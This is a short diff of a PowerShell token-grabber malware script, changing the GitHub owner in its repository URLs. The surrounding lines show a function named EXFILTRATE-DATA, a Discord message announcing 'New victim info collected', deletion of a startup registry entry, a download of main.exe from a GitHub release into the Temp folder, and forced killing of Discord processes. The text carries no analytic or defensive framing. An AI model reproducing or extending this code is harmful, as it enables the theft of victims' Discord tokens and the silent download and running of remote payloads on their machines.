@@ -698,7 +698,7 @@ function EXFILTRATE-DATA {
         "embeds" = @(
             @{
                 "title" = "POWERSHELL GRABBER"
-                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
+                "url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                 "description" = "New victim info collected !"
                 "color" = "3447003"
                 "footer" = @{
@@ -987,7 +987,7 @@ function EXFILTRATE-DATA {
         Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force | Out-Null
     } catch {}
 
-    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
+    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
     Stop-Process -Name "discord" -Force | Out-Null
     Stop-Process -Name "discordcanary" -Force | Out-Null
